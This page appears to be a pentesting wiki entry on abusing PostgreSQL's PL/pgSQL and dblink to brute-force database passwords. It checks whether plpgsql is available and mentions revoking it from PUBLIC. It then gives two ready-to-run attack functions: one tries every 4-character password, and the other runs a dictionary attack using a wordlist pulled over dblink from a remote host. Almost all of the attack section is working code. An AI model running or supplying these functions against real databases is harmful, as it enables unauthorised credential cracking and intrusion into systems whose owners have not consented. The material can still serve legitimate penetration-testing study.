---
layout: page
title: PL/pgSQL Password Bruteforce
description:
category: postgresql
toc:
  sidebar: left
---

# PL/pgSQL Password Bruteforce

**Find [more information about these attack in the original paper](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)**.

PL/pgSQL is a **fully featured programming language** that extends beyond the capabilities of SQL by offering **enhanced procedural control**. This includes the utilization of loops and various control structures. Functions crafted in the PL/pgSQL language can be invoked by SQL statements and triggers, broadening the scope of operations within the database environment.

You can abuse this language in order to ask PostgreSQL to brute-force the users credentials, but it must exist on the database. You can verify it's existence using:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+---------
     plpgsql |
```

By default, **creating functions is a privilege granted to PUBLIC**, where PUBLIC refers to every user on that database system. To prevent this, the administrator could have had to revoke the USAGE privilege from the PUBLIC domain:

```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```

In that case, our previous query would output different results:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+-----------------
     plpgsql | {admin=U/admin}
```

Note that for the following script to work **the function `dblink` needs to exist**. If it doesn't you could try to create it with

```sql
CREATE EXTENSION dblink;
```

## Password Brute Force

Here how you could perform a 4 chars password bruteforce:

```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
    word TEXT;
BEGIN
    FOR a IN 65..122 LOOP
        FOR b IN 65..122 LOOP
            FOR c IN 65..122 LOOP
                FOR d IN 65..122 LOOP
                    BEGIN
                        word := chr(a) || chr(b) || chr(c) || chr(d);
                        PERFORM(SELECT * FROM dblink(' host=' || host ||
                                                    ' port=' || port ||
                                                    ' dbname=' || dbname ||
                                                    ' user=' || username ||
                                                    ' password=' || word,
                                                    'SELECT 1')
                                                    RETURNS (i INT));
                                                    RETURN word;
                        EXCEPTION
                            WHEN sqlclient_unable_to_establish_sqlconnection
                                THEN
                                    -- do nothing
                    END;
                END LOOP;
            END LOOP;
        END LOOP;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

_Note that even brute-forcing 4 characters may take several minutes._

You could also **download a wordlist** and try only those passwords (dictionary attack):

```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
    FOR word IN (SELECT word FROM dblink('host=1.2.3.4
                                            user=name
                                            password=qwerty
                                            dbname=wordlists',
                                            'SELECT word FROM wordlist')
                                        RETURNS (word TEXT)) LOOP
        BEGIN
            PERFORM(SELECT * FROM dblink(' host=' || host ||
                                            ' port=' || port ||
                                            ' dbname=' || dbname ||
                                            ' user=' || username ||
                                            ' password=' || word,
                                            'SELECT 1')
                                        RETURNS (i INT));
            RETURN word;

            EXCEPTION
                WHEN sqlclient_unable_to_establish_sqlconnection THEN
                    -- do nothing
        END;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
